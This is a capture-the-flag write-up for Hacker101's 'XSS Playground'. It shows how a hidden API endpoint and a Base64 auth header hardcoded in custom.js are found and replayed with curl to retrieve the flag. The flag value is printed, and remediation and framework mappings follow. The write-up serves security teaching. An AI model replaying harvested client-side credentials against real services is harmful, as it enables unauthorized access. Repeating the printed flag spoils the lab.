# XSS Playground by zseano: Writeup (1/1)

**Difficulty:** Moderate  
**Category:** Web (API Recon, Authentication Bypass)  
**Flags:** 1/1 (complete)  
**Platform:** Hacker101 CTF  
**Note:** Misleading name: no real XSS here; it's hidden API exploitation with an auth header

---

## Challenge Overview

**Context:** "XSS Playground" created by researcher zseano. The name is a red herring: the flag is not behind any conventional XSS vector. There is a hidden API that must be discovered by reading the page JavaScript, and authentication uses a non-standard header with a value found in the source.

**What you face:** A page that appears to be for XSS practice, but the real flag is behind an API endpoint protected by authentication via a header. The challenge teaches JavaScript recon before attempting any payload.

**Vulnerabilities exploited:**
- API Endpoint Discovery: client-side JavaScript exposes a hidden endpoint
- Missing Authentication via Security Through Obscurity: endpoint protected only by a secret header hardcoded in the JS
- Information Disclosure (CWE-200): API credentials in client-side JavaScript code

**What you learn:**
- Always read the application's JavaScript before trying XSS or other payloads
- "Security through obscurity" (hiding URLs) is not security: the JS is public
- Custom authentication headers may be exposed in the JS source
- The challenge name can be a false lead: investigate all surfaces before focusing on one vector

---

## Objective

Discover a hidden API endpoint and the correct authentication header to extract the flag.

## Prerequisites

- Active XSS Playground instance
- curl or browser with DevTools

---

## Flag 0: API recon + auth header bypass

**Vulnerability:** Authentication credentials hardcoded in client-side JavaScript.

### Step 1: Examine JavaScript files

Navigate to the application's `custom.js` file:

```
https://<INSTANCE>/custom.js
```

### Step 2: Extract the endpoint and authentication header

The file reveals:

```javascript
// API Endpoint
api/action.php?act=getemail

// Authentication header
X-SAFEPROTECTION: enNlYW5vb2Zjb3Vyc2U=
```

The Base64 value `enNlYW5vb2Zjb3Vyc2U=` decodes to `zseanoofcourse` (a reference to the challenge author).

### Step 3: Call the API with the correct header

```bash
curl -v \
  -H "X-SAFEPROTECTION: enNlYW5vb2Zjb3Vyc2U=" \
  --http1.1 \
  "https://<INSTANCE>/api/action.php?act=getemail"
```

### Step 4: Capture the flag

JSON response:

```json
{"email":"zseano@ofcourse.com","flag":"^FLAG^89ec6cd190ffb06f93bc09fa5c389f6a2ad8d2849ec8518c71f7c525526a2a2e$"}
```

Note: the flag may appear without the `FLAG$` suffix: complete it manually if needed:

```
^FLAG^89ec6cd190ffb06f93bc09fa5c389f6a2ad8d2849ec8518c71f7c525526a2a2e$FLAG$
```

---

## Why It Works

1. The endpoint `/api/action.php?act=getemail` is not linked in the visible interface
2. The `X-SAFEPROTECTION` header is "protection" by obscurity: it only needs to be in the JS
3. The Base64 value is trivially decodable
4. No other access control protects the endpoint

---

## Lessons Learned

1. **Challenge names are misleading**: "XSS Playground" had no XSS: it was API recon
2. **Client-side JS must not contain secrets**: tokens, keys, and sensitive endpoints in JS are public
3. **Security through obscurity fails**: "hidden" headers and endpoints are merely hard to find, not secure
4. **Base64 is not encryption**: any Base64 value in client-side JS is plaintext

## Remediation

- Remove credentials and tokens from JavaScript code
- Implement real authentication (OAuth, JWT with server-side validation)
- API endpoint access control must be validated server-side, not via header alone

---

## MITRE ATT&CK Mapping

| Tactic | Technique | TTP-ID |
|---|---|---|
| Reconnaissance | Active Scanning: Vulnerability Scanning | T1595.002 |
| Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 |
| Discovery | Application Window Discovery (API endpoint) | T1010 |
| Collection | Data from Information Repositories | T1213 |
| Defense Evasion | Obfuscated Files or Information: Encoding | T1027.013 |

---

## OWASP Top 10 2021

- **A04:2021 Insecure Design**: API endpoint protected only by an obscure header, no real authentication
- **A02:2021 Cryptographic Failures**: Base64 encoding used as a "security" mechanism

## MITRE D3FEND Countermeasures

- **D3-MFA (Multi-factor Authentication)**: enforce real authentication on all API endpoints
- **D3-ACL (Access Control List)**: restrict API access to authenticated sessions only
- **D3-ANCI (Application Configuration Hardening)**: remove secrets from client-side code

## NIST CSF 2.0

- **Protect (PR.AA)**: enforce server-side authentication on every API endpoint
- **Protect (PR.DS)**: never expose credentials or tokens in client-side code
- **Detect (DE.CM)**: monitor for unauthorized API access patterns

## NIST SP 800-53 Rev. 5

- **AC-3 (Access Enforcement)**: implement proper access control on API endpoints
- **IA-5 (Authenticator Management)**: never store credentials in client-side JavaScript
- **SC-12 (Cryptographic Key Establishment)**: use proper cryptography, not Base64 encoding
- **SC-8 (Transmission Confidentiality)**: protect sensitive API responses in transit

---

Thanks guys!! (❍ᴥ❍ʋ)

---

Security by obscurity is not security at all. If this walkthrough showed you why hidden headers and Base64 "encryption" are a joke, spread the word.

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
